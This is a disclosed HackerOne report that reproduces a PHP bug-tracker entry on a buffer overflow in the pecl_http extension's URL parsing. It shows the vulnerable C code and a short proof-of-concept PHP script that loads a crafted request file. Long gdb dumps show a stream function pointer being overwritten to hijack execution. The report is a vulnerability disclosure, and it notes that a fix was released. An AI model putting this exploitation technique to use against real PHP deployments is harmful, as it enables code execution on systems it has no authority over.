# Buffer overflow in HTTP url parsing functions

## Report Details
- **Report ID**: 121863
- **URL**: https://hackerone.com/reports/121863
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-03-09T21:17:38.444Z
- **Disclosed**: 2016-07-28T13:17:16.569Z

## Reporter
- **Username**: rc0r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
This bug report was submitted directly to the PHP bug tracker:
<https://bugs.php.net/bug.php?id=71719>

The issue was verified and fixed on 2016-03-09. Updated HTTP packages 2.5.6 and 3.0.1 were released the same day.

Following you find the bug description that has been reported to the PHP maintainers:


# Description

The HTTP url parsing functions allow overflowing a buffer with data originating from an arbitrary HTTP request. Affected are the `parse_*()` functions in `php_http_url.c` that are called from within `php_http_url_parse()`. Other parsing functions were not tested but might be affected as well.
The problem occurs when non-printable characters contained in an URL are converted into percent-encoding. The `state->offset` used in these functions is incremented without sufficient checks
regarding the size of the allocated `state->buffer`.

Example from `parse_mb()` in `php_http_url.c:781`:

```c
static size_t parse_mb(struct parse_state *state, ...)
{
// [...]
    } else {
                int i = 0;

                PHP_HTTP_DUFF(consumed,
                        state->buffer[state->offset++] = '%';
                        state->buffer[state->offset++] = parse_xdigits[((unsigned char) ptr[i]) >> 4];
                        state->buffer[state->offset++] = parse_xdigits[((unsigned char) ptr[i]) & 0xf];
                        ++i;
                );
            }
// [...]
```

A `php_stream_ops` structure is stored in memory adjacent to the `state->buffer`. This struct holds valid callback function pointers for stdio-like functions (see `php_streams.h:118`). During my tests it was possible to modify one of these function pointers, get it called and execute absolutely unrelated instructions within the php binary.
**Thus I believe it's possible to use the described flaw to execute arbitrary code.**


# Proof of Concept

PHP test script:

```php
/*
        http_message_parse.php
        poc.req:
        http://hlt99.blinkenshell.org/php/poc.req
*/
<?php
 $http_msg = new http\Message(file_get_contents("poc.req"), false);
?>
```

PHP build configuration:

```bash
./configure --enable-mysqlnd --enable-soap --with-openssl --with-sqlite3 --enable-raphf --enable-propro --with-http --with-zlib-dir --enable-zip --enable-intl && make
```

Program state before buffer overflow:

    $ gdb ./sapi/cli/php
    gdb> b streams.c:467
    gdb> r http_message_parse.php
    [...]
    RAX: 0x10031c0 --> 0x794560 (<php_stdiop_write>)
            ^-- !! original callback function pointer
    RBX: 0x7ffff1870300
    RCX: 0x1 
    RDX: 0x7ffff1871078 
    RSI: 0x1 
    RDI: 0x7ffff1870300
    RBP: 0x3 
    RSP: 0x7fffffffab30 
    RIP: 0x78f5b4 (<_php_stream_free+308>:	call   QWORD PTR [rax+0x10])
    R8 : 0x1 
    R9 : 0x0 
    R10: 0x74000 
    R11: 0x1 
    R12: 0x0 
    R13: 0x102ea40 --> 0x0 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    => 0x78f5b4 <_php_stream_free+308>:	call   QWORD PTR [rax+0x10]
    [------------------------------------------------------------------------------]
    0x000000000078f5b4	467			ret = stream->ops->close(stream, preserve_handle ? 0 : 1);

Program state after `php_stream_ops` struct has been overwritten:

    gdb> c
    RAX: 0x1004130 --> 0x82f490 (<ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER>)
            ^-- !! lower 3 bytes overwritten (halfbyte at offset 0x3f converted to hex char
                !! and byte at offset 0x40 in poc.req
                !! plus trailing 0x00 inserted by url parsing functions)
    RBX: 0x7ffff1870400
    RCX: 0x1 
    RDX: 0x2 
    RSI: 0x1 
    RDI: 0x7ffff1870400
    RBP: 0xb ('\x0b')
    RSP: 0x7fffffffa8a0
    RIP: 0x78f5b4 (<_php_stream_free+308>:	call   QWORD PTR [rax+0x10])
    R8 : 0x1 
    R9 : 0x0 
    R10: 0x682f377068702f73 ('s/php7/h')
    R11: 0x170 
    R12: 0x0 
    R13: 0x102ea40 --> 0x0 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    => 0x78f5b4 <_php_stream_free+308>:	call   QWORD PTR [rax+0x10] 
    [------------------------------------------------------------------------------]
    0x000000000078f5b4	467			ret = stream->ops->close(stream, preserve_handle ? 0 : 1);

Crash on an arbitrary instruction:

    gdb> c
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    RAX: 0x1004130 --> 0x82f490 (<ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER>)
    RBX: 0x7ffff1870400
    RCX: 0x1 
    RDX: 0x2 
    RSI: 0x1 
    RDI: 0x7ffff1870400
    RBP: 0xb ('\x0b')
    RSP: 0x7fffffffa880
    RIP: 0x82f346 (<ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6>:    movsxd rbx,DWORD PTR [r15+0x8])
    R8 : 0x1 
    R9 : 0x0 
    R10: 0x682f377068702f73 ('s/php7/h')
    R11: 0x170 
    R12: 0x0 
    R13: 0x102ea40 --> 0x0 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x82f340 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER>:    push   rbp
       0x82f341 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+1>:    push   rbx
       0x82f342 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+2>:    sub    rsp,0x8
    => 0x82f346 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6>:    movsxd rbx,DWORD PTR [r15+0x8]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:44295
    44295        op1 = _get_zval_ptr_var(opline->op1.var, execute_data, &free_op1);


# Further Debug Info    

Backtrace right after overflow, before modified function pointers are called:

    gdb> b php_http_url.c:1514
    gdb> r
    Breakpoint 2, php_http_url_parse (
    str=str@entry=0x7ffff185da05 "5 HTTP/1.1\nA\265_eptA eg", '\262' <repeats 20 times>, "ղ", '\262' <repeats 14 times>, "\260\260A HTTP/1.1\nA\265_eptABCDEFGHI", '\262' <repeats 25 times>, "TTP//X-Csrf-Token:1.0  HTTP/\215.0", len=len@entry=0x1, flags=flags@entry=0xffffffff)
    at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514
    1514		if (!parse_hier(state)) {
    gdb> bt
    #0  php_http_url_parse (
        str=str@entry=0x7ffff185da05 "5 HTTP/1.1\nA\265_eptA eg", '\262' <repeats 20 times>, "ղ", '\262' <repeats 14 times>, "\260\260A HTTP/1.1\nA\265_eptABCDEFGHI", '\262' <repeats 25 times>, "TTP//X-Csrf-Token:1.0  HTTP/\215.0", len=len@entry=0x1, flags=flags@entry=0xffffffff)
        at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514
    #1  0x0000000000736bf1 in php_http_info_parse (info=info@entry=0x7fffffffaa20, 
        pre_header=0x7ffff185da00 "\200\254Td 5 HTTP/1.1\nA\265_eptA eg", '\262' <repeats 20 times>, "ղ", '\262' <repeats 14 times>, "\260\260A HTTP/1.1\nA\265_eptABCDEFGHI", '\262' <repeats 25 times>, "TTP//X-Csrf-Token:1.0  HTTP/\215.0")
        at /home/rc0r/tmp/php-src/ext/http/src/php_http_info.c:138
    #2  0x0000000000735838 in php_http_header_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, 
        flags=flags@entry=0x1, headers=0x7ffff1882090, callback_func=0x73a670 <php_http_message_info_callback>, 
        callback_arg=callback_arg@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_header_parser.c:151
    #3  0x0000000000740644 in php_http_message_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, flags=0x1, 
        message=message@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_message_parser.c:249
    #4  0x000000000073ba48 in php_http_message_parse (msg=0x7ffff1882070, msg@entry=0x0, 
        str=str@entry=0x7ffff185d8d8 "\200\254Td 5 HTTP/1.1\nA\265_eptA eg", '\262' <repeats 20 times>, "ղ", '\262' <repeats 14 times>, "\260\260A HTTP/1.1\nA\265_eptABCDEFGHI", '\262' <repeats 25 times>, "TTP//X-Csrf-Token:1.0  HTTP/\215.0", len=<optimized out>, greedy=<optimized out>)
        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:134
    #5  0x000000000073c82d in zim_HttpMessage___construct (execute_data=<optimized out>, return_value=<optimized out>)
        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:1061
    #6  0x00000000008560f2 in ZEND_DO_FCALL_SPEC_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:842
    #7  0x000000000081273b in execute_ex (ex=<optimized out>) at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:414
    #8  0x0000000000864567 in zend_execute (op_array=0x7ffff187d000, op_array@entry=0x7ffff185d860, return_value=return_value@entry=0x7ffff1813030)
        at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:458
    #9  0x00000000007d4ee4 in zend_execute_scripts (type=type@entry=0x8, retval=0x7ffff1813030, retval@entry=0x0, file_count=file_count@entry=0x3)
        at /home/rc0r/tmp/php-src/Zend/zend.c:1427
    #10 0x0000000000778b90 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd260) at /home/rc0r/tmp/php-src/main/main.c:2487
    #11 0x0000000000866194 in do_cli (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:974
    #12 0x0000000000443b98 in main (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:1350

## Attachments
No attachments
